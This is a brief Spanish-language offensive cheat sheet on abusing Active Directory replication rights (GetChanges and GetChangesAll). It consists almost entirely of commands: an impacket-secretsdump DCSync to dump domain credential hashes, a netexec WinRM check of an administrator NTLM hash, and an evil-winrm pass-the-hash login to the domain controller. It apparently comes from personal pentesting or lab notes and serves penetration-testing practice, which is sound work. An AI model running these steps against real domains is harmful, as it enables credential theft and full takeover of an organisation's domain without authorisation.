# Abuso ACL 

Tags: #Linux #AD #ACL #GetChangesAll #GetChanges 

## GetChangesAll y GetChanges sobre el Dominio

```bash 
# Se necesitan las dos ACLs para efectuar el DCSync 
❯ impacket-secretsdump domain.corp/user:'passwd'@IP_DC -just-dc

	# user = Usuario con los privilegios de DCSync
	# passwd = Contraseña del usuario con los privilegios 
```

```bash
Paso 2:
# Validar el hash 
❯ nxc winrm IP_DC -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
 
Paso 3:
# Ingresar por EvilWinRm
❯ evil-winrm -i IP_DC -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```